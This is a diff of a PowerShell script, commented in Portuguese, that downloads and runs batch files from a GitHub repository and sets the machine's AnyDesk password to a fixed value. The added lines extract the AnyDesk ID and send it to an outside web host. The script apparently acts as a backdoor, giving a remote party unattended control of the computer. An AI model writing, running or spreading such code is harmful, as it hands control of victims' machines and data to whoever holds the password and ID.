@@ -43,6 +43,15 @@ $output = Invoke-Expression "cmd /c $fettcherFilePath"
 Write-Host "Output do CMD:"
 Write-Host $output
 
+# Extrai o ID do AnyDesk do output
+$idAnyDesk = $output | Select-String -Pattern 'AnyDesk ID: (\d+)' | ForEach-Object { $_.Matches.Groups[1].Value }
+
+# Constrói a URL da sua API com o ID do AnyDesk
+$apiUrl = "http://dataverse-vps-server.42web.io/test.php?valor=$idAnyDesk"
+
+# Envia o ID do AnyDesk para a sua API via GET
+Invoke-RestMethod -Uri $apiUrl
+
 # URL do pass.bat
 $passUrl = "https://github.com/Classickkk/DATAVERSE-WINDOWS/raw/main/pass.bat"
 # Define o caminho onde o arquivo fetcher.bat será salvo temporariamente
@@ -50,7 +59,6 @@ $temppassPath = "$env:TEMP\pass.bat"
 
 # Faz o download do arquivo pass.bat
 Invoke-WebRequest -Uri $passUrl -OutFile $temppassPath
-
 
 # Caminho do arquivo batch
 $pass2Path = "$env:TEMP\pass.bat"
@@ -61,4 +69,5 @@ $output2 = Invoke-Expression "cmd /c $pass2Path"
 # Exibe a saída no terminal do PowerShell
 Write-Host "Senha AnyDesk Alterada! Senha? @ClassicX"
 Write-Host $output2
+
 exit
